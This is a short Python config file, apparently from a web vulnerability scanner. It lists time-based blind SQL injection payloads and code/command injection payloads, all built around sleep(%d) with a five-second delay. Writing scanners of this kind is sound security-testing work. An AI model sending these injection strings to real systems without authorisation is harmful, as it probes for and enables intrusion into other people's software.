# coding=utf-8
# config file
# dict 格式存储

# sqli config

sqli_config = {
    "delay": 0,
    "sleep_time": 5,

    "payload": {
        "'xor(sleep(%d))or'",
        "\"xor(sleep(%d))or\"",
        "1 xor(sleep(%d))or'",
        ",sleep(%d)",
    }
}

# code&command inject config

code_inject_config = {
    "delay": 0,
    "sleep_time": 5,

    "payload": {
        "${sleep %d}",
        "'.(sleep(%d).",
        "\".(sleep(%d)).\"",
    }
}